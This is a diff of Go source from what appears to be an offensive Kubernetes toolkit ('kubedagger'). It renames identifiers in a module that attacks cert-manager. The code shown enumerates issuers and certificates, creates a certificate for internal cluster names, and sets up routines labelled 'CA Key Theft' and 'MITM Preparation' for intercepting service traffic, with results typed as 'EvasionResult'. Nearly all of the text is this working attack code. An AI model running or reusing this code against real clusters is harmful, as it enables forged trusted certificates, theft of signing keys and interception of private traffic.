@@ -12,19 +12,19 @@ import (
 	"k8s.io/client-go/kubernetes"
 )
 
-var certManagerIssuerGVR = schema.GroupVersionResource{
+var cnativeCertsIssuerGVR = schema.GroupVersionResource{
 	Group: "cert-manager.io", Version: "v1", Resource: "issuers",
 }
 
-var certManagerClusterIssuerGVR = schema.GroupVersionResource{
+var cnativeCertsClusterIssuerGVR = schema.GroupVersionResource{
 	Group: "cert-manager.io", Version: "v1", Resource: "clusterissuers",
 }
 
-var certManagerCertificateGVR = schema.GroupVersionResource{
+var cnativeCertsCertificateGVR = schema.GroupVersionResource{
 	Group: "cert-manager.io", Version: "v1", Resource: "certificates",
 }
 
-func detectCertManager(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
+func detectCnativeCerts(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
 	namespaces := []string{"cert-manager", "kube-system"}
 	for _, ns := range namespaces {
 		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
@@ -32,10 +32,10 @@ func detectCertManager(ctx context.Context, client kubernetes.Interface) []Detec
 		})
 		if err == nil && len(pods.Items) > 0 {
 			return []DetectionSystem{{
-				Name:      "cert-manager",
+				Name:      "cnative-certs",
 				Detected:  true,
 				Namespace: ns,
-				Details:   fmt.Sprintf("%d cert-manager pods", len(pods.Items)),
+				Details:   fmt.Sprintf("%d cnative-certs pods", len(pods.Items)),
 			}}
 		}
 
@@ -44,10 +44,10 @@ func detectCertManager(ctx context.Context, client kubernetes.Interface) []Detec
 		})
 		if err == nil && len(pods.Items) > 0 {
 			return []DetectionSystem{{
-				Name:      "cert-manager",
+				Name:      "cnative-certs",
 				Detected:  true,
 				Namespace: ns,
-				Details:   fmt.Sprintf("%d cert-manager pods", len(pods.Items)),
+				Details:   fmt.Sprintf("%d cnative-certs pods", len(pods.Items)),
 			}}
 		}
 	}
@@ -55,27 +55,27 @@ func detectCertManager(ctx context.Context, client kubernetes.Interface) []Detec
 	return nil
 }
 
-// ExploitCertManager executes the specified cert-manager exploitation technique.
-func ExploitCertManager(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
+// ExploitCnativeCerts executes the specified cnative-certs exploitation technique.
+func ExploitCnativeCerts(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
 	switch technique {
 	case "enumerate":
-		return certManagerEnumerate(ctx, dynClient)
+		return cnativeCertsEnumerate(ctx, dynClient)
 	case "issue_cert":
-		return certManagerIssueCert(ctx, dynClient)
+		return cnativeCertsIssueCert(ctx, dynClient)
 	case "steal_ca":
-		return certManagerStealCA(ctx, client, dynClient)
+		return cnativeCertsStealCA(ctx, client, dynClient)
 	case "mitm_prep":
-		return certManagerMITMPrep(ctx, client, dynClient)
+		return cnativeCertsMITMPrep(ctx, client, dynClient)
 	default:
-		return certManagerEnumerate(ctx, dynClient)
+		return cnativeCertsEnumerate(ctx, dynClient)
 	}
 }
 
-func certManagerEnumerate(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeCertsEnumerate(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("cert-manager Enumeration:\n\n")
+	sb.WriteString("cnative-certs Enumeration:\n\n")
 
-	clusterIssuers, err := dynClient.Resource(certManagerClusterIssuerGVR).List(ctx, metav1.ListOptions{})
+	clusterIssuers, err := dynClient.Resource(cnativeCertsClusterIssuerGVR).List(ctx, metav1.ListOptions{})
 	if err != nil {
 		fmt.Fprintf(&sb, "  Cannot list ClusterIssuers: %v\n", err)
 		sb.WriteString("  cert-manager CRDs may not be installed\n")
@@ -107,7 +107,7 @@ func certManagerEnumerate(ctx context.Context, dynClient dynamic.Interface) (*Ev
 		}
 	}
 
-	issuers, err := dynClient.Resource(certManagerIssuerGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	issuers, err := dynClient.Resource(cnativeCertsIssuerGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err == nil {
 		fmt.Fprintf(&sb, "\n  Namespace Issuers (%d):\n", len(issuers.Items))
 		for _, issuer := range issuers.Items {
@@ -115,7 +115,7 @@ func certManagerEnumerate(ctx context.Context, dynClient dynamic.Interface) (*Ev
 		}
 	}
 
-	certs, err := dynClient.Resource(certManagerCertificateGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	certs, err := dynClient.Resource(cnativeCertsCertificateGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err == nil {
 		fmt.Fprintf(&sb, "\n  Certificates (%d):\n", len(certs.Items))
 		for _, cert := range certs.Items {
@@ -144,15 +144,15 @@ func certManagerEnumerate(ctx context.Context, dynClient dynamic.Interface) (*Ev
 	}, nil
 }
 
-func certManagerIssueCert(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeCertsIssueCert(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("cert-manager Certificate Issuance:\n\n")
+	sb.WriteString("cnative-certs Certificate Issuance:\n\n")
 
 	sb.WriteString("  Requesting a certificate for an arbitrary domain using existing issuers.\n")
 	sb.WriteString("  If a CA issuer exists with access to a root/intermediate CA,\n")
 	sb.WriteString("  we can issue valid certificates for any domain name.\n\n")
 
-	clusterIssuers, err := dynClient.Resource(certManagerClusterIssuerGVR).List(ctx, metav1.ListOptions{})
+	clusterIssuers, err := dynClient.Resource(cnativeCertsClusterIssuerGVR).List(ctx, metav1.ListOptions{})
 	if err != nil || len(clusterIssuers.Items) == 0 {
 		sb.WriteString("  No ClusterIssuers available for cert issuance\n")
 		return &EvasionResult{Technique: "issue_cert", Success: false, Output: sb.String()}, nil
@@ -203,13 +203,13 @@ func certManagerIssueCert(ctx context.Context, dynClient dynamic.Interface) (*Ev
 		},
 	}
 
-	_, err = dynClient.Resource(certManagerCertificateGVR).Namespace("default").Create(ctx, cert, metav1.CreateOptions{})
+	_, err = dynClient.Resource(cnativeCertsCertificateGVR).Namespace("default").Create(ctx, cert, metav1.CreateOptions{})
 	if err != nil {
 		fmt.Fprintf(&sb, "  Certificate request failed: %v\n", err)
 		sb.WriteString("  May need to adjust the certificate spec or target a namespace issuer\n")
 	} else {
 		fmt.Fprintf(&sb, "  [+] Certificate 'kubedagger-cert' created using issuer '%s'\n", targetIssuer)
-		sb.WriteString("  [+] cert-manager will store the signed cert in secret 'kubedagger-tls'\n")
+		sb.WriteString("  [+] cnative-certs will store the signed cert in secret 'kubedagger-tls'\n")
 		sb.WriteString("  [+] DNS names: *.internal.cluster.local, kubernetes.default.svc\n")
 	}
 
@@ -225,11 +225,11 @@ func certManagerIssueCert(ctx context.Context, dynClient dynamic.Interface) (*Ev
 	}, nil
 }
 
-func certManagerStealCA(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeCertsStealCA(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("cert-manager CA Key Theft:\n\n")
+	sb.WriteString("cnative-certs CA Key Theft:\n\n")
 
-	clusterIssuers, err := dynClient.Resource(certManagerClusterIssuerGVR).List(ctx, metav1.ListOptions{})
+	clusterIssuers, err := dynClient.Resource(cnativeCertsClusterIssuerGVR).List(ctx, metav1.ListOptions{})
 	if err != nil {
 		fmt.Fprintf(&sb, "  Cannot list ClusterIssuers: %v\n", err)
 		return &EvasionResult{Technique: "steal_ca", Success: false, Output: sb.String()}, nil
@@ -295,14 +295,14 @@ func certManagerStealCA(ctx context.Context, client kubernetes.Interface, dynCli
 	}, nil
 }
 
-func certManagerMITMPrep(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeCertsMITMPrep(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("cert-manager MITM Preparation:\n\n")
+	sb.WriteString("cnative-certs MITM Preparation:\n\n")
 
-	sb.WriteString("  Using cert-manager to prepare for man-in-the-middle attacks.\n")
+	sb.WriteString("  Using cnative-certs to prepare for man-in-the-middle attacks.\n")
 	sb.WriteString("  Strategy: issue certs for target services, intercept their traffic.\n\n")
 
-	certs, err := dynClient.Resource(certManagerCertificateGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	certs, err := dynClient.Resource(cnativeCertsCertificateGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err != nil {
 		fmt.Fprintf(&sb, "  Cannot list certificates: %v\n", err)
 		return &EvasionResult{Technique: "mitm_prep", Success: false, Output: sb.String()}, nil
